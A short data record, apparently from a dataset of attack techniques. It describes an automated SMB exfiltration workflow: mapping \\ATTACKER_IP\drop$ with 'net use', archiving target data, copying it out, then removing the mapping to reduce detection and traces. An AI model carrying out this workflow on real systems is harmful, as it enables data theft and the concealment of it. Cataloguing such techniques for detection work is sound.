command: [REDACTED: Non-executable placeholder] Automated exfiltration via SMB mapping would typically: map \\ATTACKER_IP\drop$ with 'net use', Compress-Archive a target folder, Copy-Item the archive to the UNC path, then delete the mapping.
explanation: High-level example of an automated file-package-and-transfer workflow leveraging an SMB share mapped using the 'net' utility. Details are intentionally withheld.
rationale_steps: Use net use to authenticate and map a remote SMB share
Compress target data into a single archive to reduce size and detection
Copy the archive to the mapped UNC path for exfiltration
Remove the SMB mapping to minimize traces
